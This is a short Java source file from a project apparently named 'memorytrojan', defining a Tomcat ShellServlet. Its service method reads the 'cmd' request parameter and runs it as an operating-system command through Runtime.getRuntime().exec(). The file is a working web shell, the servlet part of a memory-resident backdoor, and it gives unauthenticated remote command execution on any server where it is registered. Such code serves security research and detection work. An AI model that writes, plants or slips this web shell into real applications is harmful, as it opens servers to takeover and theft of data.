package com.yyjccc.memorytrojan.Tomcat;

import javax.servlet.*;
import java.io.IOException;

public class ShellServlet implements Servlet {
	@Override
	public void init(ServletConfig servletConfig){

	}

	@Override
	public ServletConfig getServletConfig() {
		return null;
	}

	@Override
	public void service(ServletRequest servletRequest, ServletResponse servletResponse) {
		String cmd = servletRequest.getParameter("cmd");
		if(cmd!=null){
			try {
				Runtime.getRuntime().exec(cmd);
			} catch (IOException e) {
				throw new RuntimeException(e);
			}
		}

	}

	@Override
	public String getServletInfo() {
		return null;
	}

	@Override
	public void destroy() {

	}
}
